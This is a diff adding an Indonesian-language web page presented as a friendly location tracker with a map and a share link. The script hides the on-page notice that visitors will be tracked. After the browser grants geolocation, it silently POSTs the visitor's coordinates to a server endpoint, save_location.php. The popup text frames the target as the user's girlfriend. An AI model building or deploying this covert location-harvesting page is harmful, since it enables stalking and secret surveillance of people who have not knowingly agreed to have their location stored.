@@ -1,0 +1,124 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <title>Pelacak Lokasi</title>
+  <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css" />
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background: linear-gradient(to bottom right, #7dd3fc, #bae6fd);
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
+      padding: 0;
+    }
+    .card {
+      background: white;
+      padding: 20px 30px;
+      border-radius: 15px;
+      box-shadow: 0 10px 25px rgba(0,0,0,0.1);
+      text-align: center;
+      width: 90%;
+      max-width: 500px;
+    }
+    #map {
+      height: 300px;
+      margin-top: 15px;
+      border-radius: 10px;
+    }
+    .share {
+      margin-top: 10px;
+    }
+    input[type="text"] {
+      width: 100%;
+      padding: 8px;
+      margin-top: 8px;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="card">
+    <h2>Pelacak Lokasi Anda 📍</h2>
+    <p id="lokasiNotice">Izinkan lokasi agar kamu bisa dilacak real-time 📍</p>
+    <div id="info">Menunggu izin lokasi...</div>
+    <div id="map"></div>
+    <div class="share" id="shareSection" style="display:none;">
+      <p>Bagikan lokasi kamu dengan teman:</p>
+      <input type="text" id="shareLink" readonly />
+    </div>
+  </div>
+
+  <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
+  <script>
+    const infoDiv = document.getElementById("info");
+    const mapDiv = document.getElementById("map");
+    const shareSection = document.getElementById("shareSection");
+    const shareLink = document.getElementById("shareLink");
+
+    function initMap(lat, lon, isShared = false) {
+      const map = L.map('map').setView([lat, lon], 15);
+      L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+        attribution: '&copy; OpenStreetMap contributors'
+      }).addTo(map);
+      L.marker([lat, lon]).addTo(map)
+        .bindPopup(isShared ? 'Lokasi pacar kamu 📍' : 'Kamu di sini 😄')
+        .openPopup();
+    }
+
+    // Sembunyikan pesan izin lokasi
+document.getElementById("lokasiNotice").style.display = "none";
+
+
+    // Cek apakah URL punya query string lat/lon
+    const params = new URLSearchParams(window.location.search);
+    if (params.has("lat") && params.has("lon")) {
+      const lat = parseFloat(params.get("lat"));
+      const lon = parseFloat(params.get("lon"));
+      infoDiv.innerHTML = `
+        <p><strong>Latitude:</strong> ${lat}<br>
+        <strong>Longitude:</strong> ${lon}</p>
+        <p>Lokasi dari teman kamu!</p>
+      `;
+      initMap(lat, lon, true);
+    } else if ("geolocation" in navigator) {
+      navigator.geolocation.getCurrentPosition(function(pos) {
+        const lat = pos.coords.latitude;
+        const lon = pos.coords.longitude;
+
+        infoDiv.innerHTML = `
+          <p><strong>Latitude:</strong> ${lat}<br>
+          <strong>Longitude:</strong> ${lon}</p>
+          <p>Lokasi berhasil diambil!</p>
+        `;
+
+        initMap(lat, lon);
+
+        // Kirim ke server
+        fetch('save_location.php', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ latitude: lat, longitude: lon })
+        });
+
+        // Tampilkan link share
+        const url = `${window.location.origin}${window.location.pathname}?lat=${lat}&lon=${lon}`;
+        shareLink.value = url;
+        shareSection.style.display = "block";
+
+      }, function(error) {
+        infoDiv.innerHTML = "Gagal mendapatkan lokasi: " + error.message;
+      });
+    } else {
+      infoDiv.innerHTML = "Browser kamu tidak mendukung Geolocation.";
+    }
+  </script>
+
+</body>
+</html>
